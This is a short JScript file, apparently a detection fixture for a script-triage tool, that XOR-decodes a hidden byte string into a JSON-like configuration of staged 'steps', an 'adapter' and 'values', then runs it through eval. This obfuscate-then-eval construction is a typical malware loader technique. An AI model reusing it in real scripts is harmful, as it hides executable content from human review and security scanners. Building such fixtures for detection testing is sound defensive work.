// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_1a8ed357 = function(storedMaterial) {
  var keyBytes = [188,141,149,38,200];
  var recoveredMaterial = [];
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push(storedMaterial[i] ^ keyBytes[i % keyBytes.length]); }
  return recoveredMaterial;
};
var recover_ad7b2a45 = function() {
  var firstPart = [199,175,230,82,173,204,254,183,28,147,158,236,246,87,189,213,255,240,121,186,217,224,250,82,173,158,161,183,81,186,213,249,240,121,174,213,225,240,4,149,144,175,244,66,169,204,249,240,84,234,134,175,194,79,166,244,249,225,86,230,235,228,251,110,188,200,253,199,67,185,201,232,230,82,230,137,163,164,4,228,158,251,244,74,189,217,254,183,28,179,158,238,244,75,184,221,228,242,72,151,213,233,183,28,234,223,236,248,86,169,213,234,251,11,172,140,185,164,22,172,133,238,163,69,234,144,175,224,84,164,158,183,183,78,188,200,253,230,28,231,147,233,165,18,249,140,233,172,69,254,223];
  var secondPart = [163,240,94,169,209,253,249,67,230,213,227,227,71,164,213,233,186,69,250,139,184,172,21,240,140,163,241,71,188,158,161,183,83,187,217,255,202,71,175,217,227,225,4,242,158,197,224,72,188,206,232,230,85,132,221,239,186,66,248,136,188,165,66,241,223,187,246,4,228,158,235,252,74,173,227,253,244,82,160,158,183,183,101,242,224,209,192,85,173,206,254,201,122,152,201,239,249,79,171,224,209,221,83,166,200,255,240,85,187,240,236,247,122,148,207,249,244,65,173,145,233,165,18,249,140,233,172,69,254,223,163,241,71,188,158,240,185,4,187,200,236,242,67,139,211,248,251,82,234,134,191,232];
  var storedMaterial = firstPart.concat(secondPart);

  var recoveredMaterial = [];
  var pass = 0;
  while (pass < 1) { recoveredMaterial = decode_1a8ed357.call(null, storedMaterial); pass++; }
  var configurationText;
  configurationText = recoveredMaterial.length ? String.fromCharCode(recoveredMaterial[0]) : "";
  for (var bi = 1; bi < recoveredMaterial.length; bi++) { configurationText = configurationText.concat(String.fromCharCode(recoveredMaterial[bi])); }
  return configurationText;
};
var inspect_f394173a = function() {
  var configuration = eval("(" + recover_ad7b2a45.call(null) + ")");
  var table = { steps: function() { return configuration["steps"]; }, values: function() { return configuration["values"]; } };
  return { steps: table["steps"].call(null), adapter: configuration["adapter"], values: table["values"].call(null), stageCount: configuration["stageCount"] };
};
